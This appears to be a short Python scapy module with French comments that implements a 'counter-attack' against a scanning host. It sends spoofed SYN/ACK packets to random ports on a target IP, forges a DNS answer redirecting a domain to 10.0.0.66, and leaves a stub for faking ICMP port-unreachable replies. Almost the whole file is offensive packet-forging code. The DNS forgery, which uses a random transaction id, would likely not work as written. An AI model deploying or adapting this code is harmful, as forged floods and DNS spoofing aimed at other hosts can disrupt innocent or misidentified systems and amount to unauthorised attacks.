from scapy.all import IP, TCP, send, DNS, DNSRR, UDP
import random

class CounterAttack:
    def __init__(self):
        pass

    def flood_fake_responses(self, target_ip):
        print(f"[⚔️ COUNTER] Inondation de fausses réponses TCP pour {target_ip}...")
        # Envoyer des paquets TCP RST ou SYN/ACK aléatoires pour saturer les outils de scan
        for _ in range(10):
            fake_port = random.randint(1024, 65535)
            pkt = IP(dst=target_ip)/TCP(sport=fake_port, dport=random.randint(1, 1000), flags="SA")
            send(pkt, verbose=False)

    def send_fake_dns_reply(self, target_ip, query_domain):
        print(f"[⚔️ COUNTER] Envoi d'une fausse réponse DNS à {target_ip} pour {query_domain}")
        # Rediriger l'attaquant vers un faux serveur (ex: le module Ghost)
        fake_ip = "10.0.0.66" 
        dns_ans = IP(dst=target_ip)/UDP(dport=53)/DNS(id=random.randint(1, 65535), qr=1, aa=1, qd=query_domain, an=DNSRR(rrname=query_domain, rdata=fake_ip))
        send(dns_ans, verbose=False)

    def corrupt_scan_data(self, target_ip):
        print(f"[⚔️ COUNTER] Tentative de corruption des outils de scan de {target_ip}")
        # Envoyer des paquets ICMP port unreachable pour des ports qui sont en fait ouverts
        pass
